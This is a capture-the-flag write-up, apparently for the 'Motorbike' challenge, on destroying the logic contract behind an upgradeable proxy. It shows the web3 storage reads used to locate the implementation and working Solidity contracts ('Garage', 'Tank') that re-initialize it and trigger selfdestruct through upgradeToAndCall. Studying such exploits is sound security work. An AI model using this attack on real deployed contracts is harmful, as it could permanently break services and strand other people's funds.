> Would you be able to selfdestruct its engine and make the motorbike unusable ?

## Locating the implementation

The storage layout matches the `Engine` contract:

```js
await web3.eth.getStorageAt(contract.address, 0, (e,d)=>{console.log(d)});
'0x000000000000000000003a78ee8462bd2e31133de2b8f1f9cbd973d6edd60001'
await web3.eth.getStorageAt(contract.address, 1, (e,d)=>{console.log(d)});
'0x00000000000000000000000000000000000000000000000000000000000003e8'
```

`0x0001` are the `initialized` and `initializing` properties from the [`Initializable` base contract][contract-initializable].

These are bundled with the `upgrader` address, `0x3a78ee8462bd2e31133de2b8f1f9cbd973d6edd6`.
And finally 

I espected to find the `_IMPLEMENTATION_SLOT` in the first slot, but it is a `constant`.
It means that this variable will be replaced with its value directly in the bytecode.
There is no storage slot allocated for constants.

And now the logic contract is located at:

```js
await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc', (e,d)=>{console.log(d)});
// '0x0000000000000000000000001dcdd5d9a47e4a8773e3e28020b53cea559baefd'
```

## Re-initializing

The proxy does a `delegatecall` to `initialize`, which means it uses its storage.
Since `initialized` is set to 1, it cannot be called again from the proxy.

However, the logic contract has it set to `false`!

```js
await web3.eth.getStorageAt('0x1dcdd5d9a47e4a8773e3e28020b53cea559baefd', 0, (e,d)=>{console.log(d)});
// '0x0000000000000000000000000000000000000000000000000000000000000000'
```

So it can be reset from another contract:

```solidity
contract Garage {
    function downgrade(address target, address junk) public {
        Engine(target).initialize();
        Engine(target).upgradeToAndCall(junk, abi.encodeWithSignature("water()"));
    }
}
```

And point the implementation to a kamikaze contract:

```solidity
contract Tank {
    function water() external {
        selfdestruct(payable(0x0));
    }
}
```

Since it is called with delegate privileges, the logic contract suicides.

[contract-initializable]: https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol
